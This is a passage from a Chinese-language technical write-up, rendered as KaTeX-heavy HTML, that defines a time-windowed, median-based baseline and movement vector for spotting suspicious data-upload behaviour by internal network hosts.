reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.296999em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M1001,80H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5c4,-6.7,10,-10,18,-10zM1001 80H400000v40H1013z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5030009999999998em;"><span></span></span></span></span></span></span></span></span></p><h2 id="82-特征空间中的移动幅度引入时间维度"><a class="markdownIt-Anchor" href="#82-特征空间中的移动幅度引入时间维度"></a> 8.2 特征空间中的移动幅度（引入时间维度）</h2><p>下面我们需要确定一种<strong>距离度量</strong>（其实s1分数也是一种距离度量），该距离度量用于测量内部主机在特征空间中移动的可疑性。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>从 t-1 时刻到 t 时刻的移动，可以在欧氏空间中用距离向量来表示：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo>−</mo><msub><mi mathvariant="bold">x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi>x</mi><mi>t</mi><mn>1</mn></msubsup><mo>−</mo><msubsup><mi>x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>1</mn></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>t</mi><mn>2</mn></msubsup><mo>−</mo><msubsup><mi>x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>t</mi><mn>3</mn></msubsup><mo>−</mo><msubsup><mi>x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>3</mn></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}-\mathbf{x}_{t-1}=\left(x_{t}^{1}-x_{t-1}^{1}, x_{t}^{2}-x_{t-1}^{2}, x_{t}^{3}-x_{t-1}^{3}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.652771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999998em;"><span style="top:-2.451892em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999998em;"><span style="top:-2.451892em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999998em;"><span style="top:-2.451892em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></p><p>但这种定义方法的缺点是：假设主机A通常的数据上传量是10GB，与标准值仅仅相差１G；而主机B 通常数据上传量是几MB，而某时刻突然变为了100MB，这样主机A的距离向量显然要大于主机B。但是主机A的数据上传量几乎没有增加，而主机B的数据上传量增加了几十倍，显然B更有可能跟数据窃取有关。这种问题是由数量级偏差造成的。</p><p>此外仅仅将其与 t-1 时刻相比较也是不合适的。因此设置一个<strong>时间窗口</strong>是合适的选择，它可以反映主机不断发展的行为基线（evolving behavioral baseline）。</p><p>定义<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\beta_{t-1}(W)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span>为特征向量集合<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><msub><mi mathvariant="bold">x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi mathvariant="bold">x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn><mo>−</mo><mi>w</mi></mrow></msub><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{\mathbf{x}_{t-1}, \ldots, \mathbf{x}_{t-1-w}\right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span>的质心，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>是时间窗口的大小，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\beta_{t-1}(W)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span>定义如下：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">(</mo><msub><mi>Q</mi><mn>50</mn></msub><mrow><mo fence="true">(</mo><msub><mo>∪</mo><mi>j</mi></msub><msubsup><mi>x</mi><mi>j</mi><mn>1</mn></msubsup><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msub><mi>Q</mi><mn>50</mn></msub><mrow><mo fence="true">(</mo><msub><mo>∪</mo><mi>j</mi></msub><msubsup><mi>x</mi><mi>j</mi><mn>2</mn></msubsup><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msub><mi>Q</mi><mn>50</mn></msub><mrow><mo fence="true">(</mo><msub><mo>∪</mo><mi>j</mi></msub><msubsup><mi>x</mi><mi>j</mi><mn>3</mn></msubsup><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\beta_{t-1}(W)=\left(Q_{50}\left(\cup_{j} x_{j}^{1}\right), Q_{50}\left(\cup_{j} x_{j}^{2}\right), Q_{50}\left(\cup_{j} x_{j}^{3}\right)\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.244772em;vertical-align:-0.394772em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>j</mi><mo>∈</mo><mo stretchy="false">{</mo><mi>t</mi><mo>−</mo><mi>W</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>t</mi><mo>−</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">j \in\{t-W-1, \ldots, t-1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>，并且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\beta_{t-1}(W)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span>中的每个特征，对应特征空间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的每一个特征<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>χ</mi><mi>t</mi><mi>i</mi></msubsup></mrow><annotation encoding="application/x-tex">\chi_{t}^{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071664em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">χ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>在时间窗口W内的平均值。</p><p>下面定义移动向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{m}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span 